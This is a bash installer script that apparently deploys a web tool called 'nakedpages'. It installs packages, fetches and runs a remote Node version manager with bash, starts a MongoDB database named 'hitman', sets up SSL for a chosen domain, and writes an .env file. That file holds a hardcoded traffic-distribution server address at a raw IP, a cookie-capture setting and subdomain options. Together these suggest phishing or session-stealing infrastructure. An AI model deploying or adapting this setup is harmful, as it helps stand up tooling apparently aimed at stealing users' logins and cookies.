#!/usr/bin/env bash

mkdir -p temp
echo "Updating Apt"
apt-get update
echo "Installing Apt files"
apt-get install vim certbot php-cgi curl mongodb -y

echo "Install node v14"

curl -L https://raw.githubusercontent.com/tj/n/master/bin/n -o temp/n
bash temp/n 12

echo "Starting DB service"

service mongodb start


echo "Installing Npm packages for worker"
npm install

echo "Setting Up Daemon App Daemonize"
npm i -g pm2

read -p "Enter domain Name:(enter DEV for localhost enviroment) " domain

if [[ "$domain" == "DEV" ]]
then
	ENV="DEVELOPMENT"
	bash scripts/setup-local-ssl.sh
else
	ENV="PRODUCTION"
	bash scripts/setup-ssl.sh $domain
fi

if [ $? -ne 0 ]
then
	echo "SSL setup failed"
	exit 1
fi

echo "Setting Up Enviromental Files"

echo "Checking Hostname IP....."
hostIp=`hostname -I|xargs`
echo "Host ip is $hostIp"

echo "Checking DB Port....."
nc -z 127.0.0.1 27017
if [ $? -ne 0 ]
then
	echo "DB Service not started, Exiting......"
	exit 1
fi
export MONGODB_URI="mongodb://localhost:27017/hitman"


echo "Generating Secret....."
newSecret=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)

siteAuth=`shuf -i 1-100000 -n 1`

echo "Generating Defaults......."
MANAGER_ID="betaman"

TDS_URL="http://65.21.7.96:8990"

AUTO_DIR="auto"

RAW_COOKIES="NO"

SUBDOMAIN_CHAR="~"

LOG_FILE="nakedpages.log"

DEBUG_FILE="nakedpages-debug.log"

USER_CONFIG="config.env"

echo "Finished Generating Defaults......"

export SITE_KEY=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 4 | head -n 1)


dbReturnCode=0

if [ $dbReturnCode -eq 0 ]
then
	echo "New DB installed...."
elif [ $dbReturnCode -eq 100 ]
then
	echo "Performing DB upgrade instead Your Secret KEY will not be shown"
	newSecret="OLD SECRET KEY"
else
	echo "DB setup failed with code $?"
	exit 1
fi



cat > ".env" <<- EOM
HOST_IP=$hostIp

MONGODB_URI=$MONGODB_URI

HOST_PORT=$hostPort

MANAGER_ID=$MANAGER_ID

TDS_URL=$TDS_URL

AUTO_DIR=$AUTO_DIR

ENV=$ENV

RAW_COOKIES=$RAW_COOKIES

SUBDOMAIN_CHAR=$SUBDOMAIN_CHAR

LOG_FILE=$LOG_FILE

DEBUG_FILE=$DEBUG_FILE

USER_CONFIG=$USER_CONFIG
EOM



echo "All Ok.....Begining User Configurations/////"


node setup-user.js

if [ $? -eq 0 ]
then
	echo "USER SETUP OK!"
else
	echo "USER setup failed with code $?"
	exit 1
fi

printf "\n\nFinish!\n"

